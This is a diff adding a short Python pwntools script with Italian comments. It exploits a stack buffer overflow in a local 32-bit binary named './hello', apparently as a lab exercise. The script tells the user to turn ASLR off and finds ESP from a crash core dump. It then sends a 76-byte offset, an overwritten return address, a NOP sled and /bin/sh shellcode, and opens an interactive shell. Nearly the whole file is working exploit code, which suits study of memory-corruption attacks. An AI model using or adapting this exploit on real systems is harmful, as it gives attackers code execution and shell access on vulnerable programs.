@@ -1,0 +1,65 @@
+from pwn import *
+import os
+
+
+# --- CONTROLLO DI SISTEMA (FONDAMENTALE) ---
+# Se l'ASLR è attivo, gli indirizzi cambiano a ogni esecuzione e lo script fallirà.
+with open("/proc/sys/kernel/randomize_va_space", "r") as f:
+    if f.read().strip() != "0":
+        log.error("ASLR è ATTIVO! Disabilitalo dal terminale con:")
+        log.error("sudo sysctl -w kernel.randomize_va_space=0")
+        sys.exit(1)
+# -------------------------------------------
+
+# Impostiamo l'architettura
+context.update(arch="i386", os="linux")
+
+# Riduciamo i log per la prima fase
+context.log_level = "error"
+
+print("[*] FASE 1: Provoco un crash per trovare lo Stack Pointer reale...")
+
+# Assicuriamoci che non ci siano vecchi core dump a confonderci
+os.system("rm -f core*")
+
+# Lanciamo il processo e lo bombardiamo per farlo crashare
+p_crash = process("./hello")
+p_crash.sendline(b"A" * 150)
+p_crash.wait()  # Aspettiamo che muoia
+
+try:
+    # Pwntools legge il file core generato dal crash
+    core = p_crash.corefile
+
+    # Al momento del crash, l'EIP è 'AAAA' e l'ESP punta ai byte immediatamente successivi.
+    # Quello è il punto esatto dove inizieranno i nostri NOP!
+    real_esp = core.esp
+    print(f"[+] INDIRIZZO TROVATO: ESP = {hex(real_esp)}")
+except Exception as e:
+    print("[-] Impossibile leggere il core dump.")
+    print("[-] Assicurati di aver eseguito 'ulimit -c unlimited' nel terminale.")
+    exit()
+
+print("[*] FASE 2: Lancio dell'exploit con l'indirizzo calcolato...")
+
+# Ripristiniamo i log per vedere l'exploit in azione
+context.log_level = "info"
+
+p = process("./hello")
+
+# Risultato di de brujin
+offset = 76
+ret_address = real_esp
+
+# Generiamo lo shellcode per /bin/sh
+shellcode = asm(shellcraft.sh())
+
+# Costruiamo il payload
+payload = b"A" * offset
+payload += p32(ret_address)
+payload += b"\x90" * 32  # NOP Sled (cuscinetto)
+payload += shellcode
+
+# Inviamo il payload e passiamo alla modalità interattiva
+p.sendline(payload)
+p.interactive()
